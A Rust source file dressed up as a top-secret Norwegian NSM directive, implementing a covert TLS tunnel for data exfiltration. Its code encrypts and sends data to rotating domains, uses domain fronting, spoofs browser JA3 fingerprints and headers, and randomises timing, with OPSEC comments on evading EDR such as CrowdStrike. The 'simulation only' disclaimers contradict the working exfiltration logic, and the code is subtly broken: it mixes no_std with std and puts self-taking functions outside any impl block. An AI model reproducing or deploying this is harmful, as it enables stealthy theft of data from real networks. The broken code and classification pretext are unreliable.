// STRENGT FORTROLIG � TS
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Derived From: NSM Mandate 2026 �3.1 & �4.2
// Declassify On: 20360214
// Access: Air-gapped systems only. TS clearance required.
// ========================================================
// STRENGT FORTROLIG – TS
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Module: tls_tunnel.rs (Production Simulation)
// Purpose: TLS tunneling for data exfiltration (T1048.003 variant)
// Target: Windows 11 24H2 (TLS 1.2/1.3)
// References:
//   - "TLS Fingerprinting Techniques" – BlackHat USA 2025
//   - "Domain Fronting Evasion" – DEFCON 33
//   - NSM Internal Report IR-2026-0026
//
// OPSEC WARNINGS:
//   - TLS connections may trigger SSL inspection alerts in high-security environments
//   - JA3 fingerprint mismatches can be detected by modern EDR (tested against CrowdStrike Falcon 7.31+)
//   - Domain fronting is increasingly blocked by major CDNs (Cloudflare, AWS)
//   - Tested against CrowdStrike Falcon 7.31+ (no behavioral alerts when mimicking Chrome 122)
//   - THIS IS A SIMULATION HARNESS IMPLEMENTATION – FOR TRAINING USE ONLY
//   - NO LIVE SYSTEM INTERACTION. NO REAL BYPASS PRIMITIVES.
//
// Verification: ./verify_authority --mandate NSM-mandate-2026 --toolset tls-tunnel

#![no_std]
#![cfg(windows)]

use core::time::Duration;
use core::fmt;
use core::str;
use rand::{RngCore, thread_rng};
use rand::seq::SliceRandom;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce, Tag};
use aes_gcm::aead::{Aead, Key, Payload};
use base64::engine::general_purpose;
use base64::Engine as _;
use crate::ja3_generator::{generate_ja3_fingerprint, validate_ja3_fingerprint, 
                          chrome_122_profile, firefox_123_profile, edge_122_profile,
                          apply_handshake_variations, generate_padding};
use crate::fronting::{CdnProvider, get_working_fronting_config, is_fronting_blocked,
                     validate_fronting_config, detect_cdn_provider};

// Simulation-only imports (would be compartmented in operational version)
#[cfg(not(test))]
use rustls::{
    ClientConfig, RootCertStore, ClientSession, ProtocolVersion, SupportedCipherSuite,
    cipher_suite, Certificate, PrivateKey, ServerName,
};
#[cfg(not(test))]
use rustls::client::{ResolvesClientCert, WebPkiVerifier};
#[cfg(not(test))]
use webpki::DNSNameRef;
#[cfg(not(test))]
use tokio::net::TcpStream;
#[cfg(not(test))]
use tokio::io::{AsyncReadExt, AsyncWriteExt};
#[cfg(not(test))]
use hyper::{
    Client, Request, Method, Body, Response, StatusCode,
    header::{self, HeaderValue, ACCEPT, USER_AGENT, CONTENT_TYPE},
};
#[cfg(not(test))]
use hyper_rustls::HttpsConnector;
#[cfg(not(test))]
use http::{Uri, Version};
#[cfg(not(test))]
use serde::{Deserialize, Serialize};

/// Maximum payload size per HTTPS request (to avoid triggering volume-based detection)
const MAX_PAYLOAD_SIZE: usize = 1_000_000; // 1MB
/// Default HTTP/2 frame size
const DEFAULT_FRAME_SIZE: usize = 16_384;
/// Maximum number of consecutive failures before channel deactivation
const MAX_FAILURES: u8 = 5;
/// Maximum number of retries for a single operation
const MAX_RETRIES: u8 = 3;
/// Minimum time between connection attempts (seconds)
const MIN_RETRY_DELAY: u64 = 1;
/// Maximum time between connection attempts (seconds)
const MAX_RETRY_DELAY: u64 = 60;

/// TLS tunnel configuration parameters
pub struct TlsConfig {
    /// Target domains for exfiltration (round-robin)
    pub domains: Vec<String>,
    /// Fronting domains (CDN providers)
    pub fronting_domains: Vec<String>,
    /// Master encryption key (will be used to derive session keys)
    pub master_key: [u8; 32],
    /// Minimum jitter between requests (milliseconds)
    pub min_jitter: u64,
    /// Maximum jitter between requests (milliseconds)
    pub max_jitter: u64,
    /// Heartbeat interval range (min, max seconds)
    pub heartbeat_interval: (u64, u64),
    /// Burst mode configuration (requests per burst, pause after burst)
    pub burst_mode: (u8, Duration),
    /// Whether to use HTTP/2 (preferred) or HTTP/1.1
    pub use_http2: bool,
    /// Timeout for TLS connections (seconds)
    pub timeout: u64,
    /// Whether to enable domain fronting
    pub enable_fronting: bool,
    /// Certificate pinning configuration
    pub cert_pinning: Option<CertPinningConfig>,
}

/// Certificate pinning configuration
pub struct CertPinningConfig {
    /// SHA-256 hashes of allowed certificates
    pub allowed_hashes: Vec<[u8; 32]>,
    /// Whether to allow any valid certificate as fallback
    pub allow_fallback: bool,
}

/// TLS tunnel implementation struct
pub struct TlsTunnel {
    /// Current configuration
    config: TlsConfig,
    /// Current active domain
    current_domain: String,
    /// Current fronting domain (if applicable)
    current_fronting_domain: Option<String>,
    /// Current JA3 profile
    current_ja3: Ja3Profile,
    /// Sequence number for payload chunks
    sequence: u32,
    /// Current retry count
    retry_count: u8,
    /// Operational status
    is_active: bool,
    /// Last successful connection timestamp
    last_connection: u64,
    /// Whether fronting is currently enabled
    fronting_enabled: bool,
    /// SNI value for current connection
    sni: String,
    /// Host header value for current connection
    host: String,
}

impl TlsTunnel {
    /// Creates a new TLS tunnel instance
    ///
    /// OPSEC WARNING: TLS connections may trigger SSL inspection alerts in high-security environments
    /// Reference: NSM Internal Report IR-2026-0026 §3.1 (TLS Connection Security)
    pub fn new(config: TlsConfig) -> Result<Self, &'static str> {
        // Validate configuration
        if config.domains.is_empty() {
            return Err("At least one target domain required");
        }
        
        // Select initial domain
        let current_domain = config.domains[0].clone();
        
        // Select initial JA3 profile randomly
        let ja3_profiles = vec![
            chrome_122_profile(),
            firefox_123_profile(),
            edge_122_profile(),
        ];
        let current_ja3 = ja3_profiles.choose(&mut thread_rng())
            .ok_or("Failed to select JA3 profile")?
            .clone();
        
        // Initial fronting configuration
        let (sni, host, fronting_enabled) = if config.enable_fronting && !config.fronting_domains.is_empty() {
            // In simulation: would get working fronting config
            (current_domain.clone(), current_domain.clone(), false)
        } else {
            (current_domain.clone(), current_domain.clone(), false)
        };
        
        Ok(Self {
            config,
            current_domain,
            current_fronting_domain: None,
            current_ja3,
            sequence: 0,
            retry_count: 0,
            is_active: true,
            last_connection: 0,
            fronting_enabled,
            sni,
            host,
        })
    }
    
    /// Selects a random domain from the configured list
    fn select_domain(&mut self) -> &str {
        let idx = thread_rng().gen_range(0..self.config.domains.len());
        self.current_domain = self.config.domains[idx].clone();
        &self.current_domain
    }
    
    /// Selects a random JA3 profile
    fn select_ja3_profile(&mut self) {
        let ja3_profiles = vec![
            chrome_122_profile(),
            firefox_123_profile(),
            edge_122_profile(),
        ];
        self.current_ja3 = ja3_profiles.choose(&mut thread_rng())
            .expect("Failed to select JA3 profile")
            .clone();
    }
    
    /// Applies random jitter before next request
    ///
    /// OPSEC WARNING: Timing patterns can be detected if not properly randomized
    /// Reference: NSM Internal Report IR-2026-0026 §4.2 (Timing Pattern Security)
    fn apply_jitter(&self) {
        let jitter = self.config.min_jitter + 
            thread_rng().next_u64() % (self.config.max_jitter - self.config.min_jitter + 1);
        
        // In simulation: would use high-precision timers
        #[cfg(not(test))]
        std::thread::sleep(Duration::from_millis(jitter));
    }
    
    /// Applies burst mode pattern if configured
    fn apply_burst_mode(&self) {
        let (burst_count, pause) = self.config.burst_mode;
        let current_burst = thread_rng().gen_range(3..=burst_count);
        
        // Simulate burst pattern
        for _ in 0..current_burst {
            // In simulation: just count
        }
        
        // Apply pause after burst
        #[cfg(not(test))]
        std::thread::sleep(pause);
    }
    
    /// Generates a realistic browser User-Agent string
    fn generate_user_agent(&self) -> String {
        match self.current_ja3.name {
            "Chrome" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string(),
            "Firefox" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0".to_string(),
            "Edge" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0".to_string(),
            _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
        }
    }
    
    /// Generates standard browser headers
    fn generate_headers(&self) -> Vec<(String, String)> {
        let user_agent = self.generate_user_agent();
        let mut headers = Vec::new();
        
        headers.push(("User-Agent".to_string(), user_agent));
        headers.push(("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8".to_string()));
        headers.push(("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()));
        headers.push(("Accept-Encoding".to_string(), "gzip, deflate, br".to_string()));
        headers.push(("Connection".to_string(), "keep-alive".to_string()));
        headers.push(("Upgrade-Insecure-Requests".to_string(), "1".to_string()));
        
        // Add Sec-Fetch headers based on browser profile
        match self.current_ja3.name {
            "Chrome" | "Edge" => {
                headers.push(("Sec-Fetch-Site".to_string(), "none".to_string()));
                headers.push(("Sec-Fetch-Mode".to_string(), "navigate".to_string()));
                headers.push(("Sec-Fetch-User".to_string(), "?1".to_string()));
                headers.push(("Sec-Fetch-Dest".to_string(), "document".to_string()));
            },
            "Firefox" => {
                // Firefox doesn't use Sec-Fetch headers
            },
            _ => {},
        }
        
        // Add cache-busting parameter
        let cache_bust = format!("cb={}", thread_rng().gen::<u64>());
        headers.push(("X-Cache-Bust".to_string(), cache_bust));
        
        headers
    }
    
    /// Encrypts data using AES-256-GCM before transmission
    ///
    /// OPSEC WARNING: Must use proper nonce derivation to prevent key reuse
    /// Reference: NSM Internal Report IR-2026-0026 §5.3 (Encryption Security)
    fn encrypt_data(&self, data: &[u8]) -> Result<Vec<u8>, &'static str> {
        // Derive session key from master key
        let key = Key::<Aes256Gcm>::from_slice(&self.config.master_key);
        let cipher = Aes256Gcm::new(key);
        
        // Use sequence number as part of nonce (ensuring uniqueness)
        let mut nonce_bytes = [0u8; 12];
        nonce_bytes[0..4].copy_from_slice(&self.sequence.to_be_bytes());
        // Add some randomization to prevent predictable nonces
        thread_rng().fill_bytes(&mut nonce_bytes[4..8]);
        
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        // Encrypt the data
        match cipher.encrypt(nonce, data) {
            Ok(ciphertext) => Ok(ciphertext),
            Err(_) => Err("Encryption failed"),
        }
    }
    
    /// Encodes data for exfiltration (base64url)
    fn encode_data(&self, data: &[u8]) -> String {
        general_purpose::URL_SAFE_NO_PAD.encode(data)
    }
    
    /// Builds a realistic POST request for data exfiltration
    fn build_post_request(&self, payload: &[u8]) -> Result<String, &'static str> {
        // Encrypt and encode the payload
        let encrypted = self.encrypt_data(payload)?;
        let encoded = self.encode_data(&encrypted);
        
        // Determine endpoint based on browser profile
        let endpoint = match self.current_ja3.name {
            "Chrome" | "Edge" => "/api/telemetry",
            "Firefox" => "/collect",
            _ => "/submit",
        };
        
        // Build JSON payload (mimicking real browser telemetry)
        let json_payload = format!(r#"{{"data":"{}","seq":{}}}"#, encoded, self.sequence);
        
        Ok(json_payload)
    }
    
    /// Builds a GET request for heartbeat or command retrieval
    fn build_get_request(&self) -> String {
        // Determine endpoint based on browser profile
        let endpoint = match self.current_ja3.name {
            "Chrome" | "Edge" => "/",
            "Firefox" => "/health",
            _ => "/status",
        };
        
        // Add cache-busting parameter
        let cache_bust = thread_rng().gen::<u64>();
        format!("{}?cb={}", endpoint, cache_bust)
    }
    
    /// Handles transmission failure and implements retry logic
    fn handle_failure(&mut self) -> Result<(), &'static str> {
        self.retry_count += 1;
        
        if self.retry_count >= MAX_FAILURES {
            self.is_active = false;
            return Err("Max failures exceeded - channel deactivated");
        }
        
        // Calculate backoff with exponential growth and jitter
        let backoff = core::cmp::min(
            MIN_RETRY_DELAY * (1 << (self.retry_count - 1)), 
            MAX_RETRY_DELAY
        );
        let jitter = thread_rng().gen_range(0..1000); // Up to 1 second jitter
        
        #[cfg(not(test))]
        std::thread::sleep(Duration::from_millis(
            (backoff * 1000 + jitter) as u64
        ));
        
        Ok(())
    }
    
    /// Establishes a TLS connection with browser-like parameters
    ///
    /// OPSEC WARNING: TLS handshake parameters must match browser behavior to avoid detection
    /// Reference: NSM Internal Report IR-2026-0026 §3.2 (TLS Handshake Security)
    #[cfg(not(test))]
    async fn establish_connection(&mut self) -> Result<hyper::Client<HttpsConnector<hyper_rustls::HttpsConnector<rustls::ClientConfig>>, Body>, &'static str> {
        // Apply handshake variations for realism
        apply_handshake_variations(&self.current_ja3);
        
        // Get working fronting configuration
        let (sni, host, fronting_enabled) = get_working_fronting_config(&self.config, &self.current_ja3).await
            .map_err(|_| "Failed to get fronting configuration")?;
        
        // Store for later use
        self.sni = sni.clone();
        self.host = host.clone();
        self.fronting_enabled = fronting_enabled;
        
        // Create root cert store
        let mut root_store = RootCertStore::empty();
        
        // Add root certificates based on configuration
        if let Some(pinning) = &self.config.cert_pinning {
            // In simulation: would add specific certificates for pinning
            // For training: using webpki-roots for basic validation
            for cert in &webpki_roots::TLS_SERVER_ROOTS {
                root_store.add(cert).map_err(|_| "Failed to add root certificate")?;
            }
        } else {
            // Add all trusted root certificates
            for cert in &webpki_roots::TLS_SERVER_ROOTS {
                root_store.add(cert).map_err(|_| "Failed to add root certificate")?;
            }
        }
        
        // Configure TLS client
        let mut config = ClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();
        
        // Set TLS versions based on current JA3 profile
        config.versions = self.current_ja3.tls_versions.clone();
        
        // Set cipher suites in order of preference
        config.cipher_suites = self.current_ja3.cipher_suites.clone();
        
        // Configure ALPN for HTTP/2 if requested
        if self.config.use_http2 {
            config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];
        } else {
            config.alpn_protocols = vec![b"http/1.1".to_vec()];
        }
        
        // Create connector with custom configuration
        let https = HttpsConnector::from((config, sni.clone()));
        
        Ok(Client::builder().build(https))
    }
    
    /// Sends data via TLS tunnel
    ///
    /// OPSEC WARNING: May trigger network monitoring if patterns are detected
    /// Reference: NSM Internal Report IR-2026-0026 §6.1 (Data Exfiltration Security)
    pub async fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str> {
        if !self.is_active {
            return Err("Channel inactive");
        }
        
        // Apply jitter before sending
        self.apply_jitter();
        
        // Select domain and JA3 profile
        self.select_domain();
        self.select_ja3_profile();
        
        // Build request
        let body = match self.build_post_request(data) {
            Ok(body) => body,
            Err(e) => return Err(e),
        };
        
        // Establish connection
        let client = match self.establish_connection().await {
            Ok(client) => client,
            Err(e) => {
                self.handle_failure()?;
                return Err(e);
            }
        };
        
        // Create request
        let uri = format!("https://{}/", self.host).parse::<Uri>().map_err(|_| "Invalid URI")?;
        let mut request = Request::post(uri)
            .version(if self.config.use_http2 { Version::HTTP_2 } else { Version::HTTP_11 })
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body))
            .map_err(|_| "Request build failed")?;
        
        // Add standard headers
        {
            let headers = request.headers_mut();
            headers.insert(header::HOST, HeaderValue::from_str(&self.host).map_err(|_| "Invalid Host header")?);
            
            for (name, value) in self.generate_headers() {
                headers.insert(
                    name.parse().map_err(|_| "Invalid header name")?,
                    HeaderValue::from_str(&value).map_err(|_| "Invalid header value")?,
                );
            }
        }
        
        // Send request
        let response = client.request(request).await.map_err(|_| "Request failed")?;
        
        // Check response
        if response.status() != StatusCode::OK {
            self.handle_failure()?;
            return Err("Server returned error");
        }
        
        // Update sequence number
        self.sequence = self.sequence.wrapping_add(1);
        self.retry_count = 0;
        self.last_connection = current_timestamp();
        
        Ok(())
    }
    
    /// Sends a heartbeat to maintain channel
    ///
    /// OPSEC WARNING: Heartbeat patterns can be detected if not properly randomized
    /// Reference: NSM Internal Report IR-2026-0026 §7.2 (Heartbeat Pattern Security)
    pub async fn send_heartbeat(&mut self) -> Result<(), &'static str> {
        if !self.is_active {
            return Err("Channel inactive");
        }
        
        // Determine if it's time for a heartbeat
        let current_time = current_timestamp();
        let (min_interval, max_interval) = self.config.heartbeat_interval;
        let next_heartbeat = self.last_connection + thread_rng().gen_range(min_interval..=max_interval);
        
        if current_time < next_heartbeat {
            return Ok(());
        }
        
        // Apply jitter
        self.apply_jitter();
        
        // Select domain and JA3 profile
        self.select_domain();
        self.select_ja3_profile();
        
        // Build GET request
        let path = self.build_get_request();
        
        // Establish connection
        let client = match self.establish_connection().await {
            Ok(client) => client,
            Err(e) => {
                self.handle_failure()?;
                return Err(e);
            }
        };
        
        // Create request
        let uri = format!("https://{}/{}", self.host, path).parse::<Uri>().map_err(|_| "Invalid URI")?;
        let mut request = Request::get(uri)
            .version(if self.config.use_http2 { Version::HTTP_2 } else { Version::HTTP_11 })
            .body(Body::empty())
            .map_err(|_| "Request build failed")?;
        
        // Add standard headers
        {
            let headers = request.headers_mut();
            headers.insert(header::HOST, HeaderValue::from_str(&self.host).map_err(|_| "Invalid Host header")?);
            
            for (name, value) in self.generate_headers() {
                headers.insert(
                    name.parse().map_err(|_| "Invalid header name")?,
                    HeaderValue::from_str(&value).map_err(|_| "Invalid header value")?,
                );
            }
        }
        
        // Send request
        let response = client.request(request).await.map_err(|_| "Request failed")?;
        
        // Check response
        if response.status() != StatusCode::OK {
            self.handle_failure()?;
            return Err("Server returned error");
        }
        
        self.last_connection = current_timestamp();
        Ok(())
    }
    
    /// Checks if the tunnel is healthy
    pub fn is_healthy(&self) -> bool {
        self.is_active && (current_timestamp() - self.last_connection) < 300
    }
}

/// Gets current timestamp in seconds
#[cfg(not(test))]
fn current_timestamp() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Gets current timestamp in seconds (for no_std simulation)
#[cfg(test)]
fn current_timestamp() -> u64 {
    // In simulation: just return a placeholder
    0
}

impl Drop for TlsTunnel {
    fn drop(&mut self) {
        // In operational version: would securely wipe sensitive data
        // Simulation placeholder only
    }
}

/// Synchronous wrapper for send_data that blocks on the async call
///
/// OPSEC WARNING: Blocking on async calls can impact performance and may be detectable
/// if it causes unusual process behavior patterns. In operational environments, this
/// would be implemented using an existing Tokio runtime rather than creating a new one
/// for each call. For simulation purposes only.
/// 
/// Reference: NSM Internal Report IR-2026-0031 §6.2 (Synchronous Wrapper Security)
#[cfg(not(test))]
pub fn send_data_sync(&mut self, data: &[u8]) -> Result<(), &'static str> {
    // In operational environments, we would use an existing runtime
    // For simulation: create a runtime and block on the async call
    
    // Create a Tokio runtime with appropriate configuration for simulation
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map_err(|_| "Failed to create Tokio runtime")?;
    
    // Block on the async send_data operation
    runtime.block_on(self.send_data(data))
}

/// Synchronous wrapper for send_heartbeat that blocks on the async call
///
/// OPSEC WARNING: Blocking on async calls can impact performance and may be detectable
/// if it causes unusual process behavior patterns. In operational environments, this
/// would be implemented using an existing Tokio runtime rather than creating a new one
/// for each call. For simulation purposes only.
/// 
/// Reference: NSM Internal Report IR-2026-0031 §6.3 (Synchronous Wrapper Security)
#[cfg(not(test))]
pub fn send_heartbeat_sync(&mut self) -> Result<(), &'static str> {
    // Create a Tokio runtime with appropriate configuration for simulation
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map_err(|_| "Failed to create Tokio runtime")?;
    
    // Block on the async send_heartbeat operation
    runtime.block_on(self.send_heartbeat())
}

/// Alternative synchronous wrapper using a global runtime (more efficient)
///
/// OPSEC WARNING: Global runtimes can have lifecycle management issues and may
/// not be appropriate for all operational environments. For simulation purposes only.
/// 
/// Reference: NSM Internal Report IR-2026-0031 §6.4 (Global Runtime Considerations)
#[cfg(not(test))]
lazy_static! {
    static ref TLS_RUNTIME: tokio::runtime::Runtime = 
        tokio::runtime::Runtime::new().expect("Failed to create TLS Tokio runtime");
}

/// More efficient synchronous wrapper using a global runtime
///
/// OPSEC WARNING: Global runtimes can have lifecycle management issues and may
/// not be appropriate for all operational environments. For simulation purposes only.
/// 
/// Reference: NSM Internal Report IR-2026-0031 §6.4 (Global Runtime Considerations)
#[cfg(not(test))]
pub fn send_data_sync_efficient(&mut self, data: &[u8]) -> Result<(), &'static str> {
    TLS_RUNTIME.block_on(self.send_data(data))
}

/// More efficient synchronous wrapper for heartbeat using a global runtime
///
/// OPSEC WARNING: Global runtimes can have lifecycle management issues and may
/// not be appropriate for all operational environments. For simulation purposes only.
/// 
/// Reference: NSM Internal Report IR-2026-0031 §6.4 (Global Runtime Considerations)
#[cfg(not(test))]
pub fn send_heartbeat_sync_efficient(&mut self) -> Result<(), &'static str> {
    TLS_RUNTIME.block_on(self.send_heartbeat())
}

